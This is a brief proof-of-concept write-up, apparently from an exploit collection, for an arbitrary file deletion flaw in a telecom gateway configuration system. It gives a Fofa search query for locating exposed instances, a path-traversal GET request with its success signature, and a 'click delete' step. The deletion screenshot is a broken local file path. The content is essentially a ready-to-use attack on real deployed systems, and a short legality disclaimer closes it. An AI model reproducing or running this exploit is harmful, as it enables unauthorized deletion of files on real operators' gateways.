### Telecom Gateway Configuration Management System Arbitrary File Deletion

**Fofa Query:** `body="img/dl.gif" && title="系统登录"`

**Vulnerability Description:** The telecom gateway configuration system suffers from an arbitrary file deletion vulnerability.

**Vulnerability POC (Proof of Concept):**

1. **Send a GET request to the following URL:**

   ```
   GET /newlive/manager/self_detail.php?dir=../../ HTTP/1.1
   ```

   **Response Code Characteristic:** 200  
   **Response Content Characteristic:** index.php

2. **Proceed with deletion:**

   ![Deletion Image](C:\Users\28162\AppData\Roaming\Typora\typora-user-images\image-20250118024828086.png)

   Simply click the delete option to perform the file deletion.

---

Please ensure that any testing or actions performed are authorized and comply with all applicable laws and regulations. Unauthorized activities can lead to legal consequences.